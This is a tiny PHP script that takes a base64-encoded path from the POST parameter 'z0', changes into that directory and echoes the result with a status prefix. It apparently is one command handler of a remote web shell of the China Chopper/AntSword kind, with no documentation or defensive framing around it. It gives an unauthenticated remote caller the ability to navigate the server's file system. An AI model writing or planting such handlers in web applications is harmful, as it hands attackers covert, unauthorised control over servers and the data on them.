<?php

$szDirPath = base64_decode($_POST['z0']);
chdir($szDirPath) or die('ERROR://Cannot open directory.');
echo('1|'.getcwd());

?>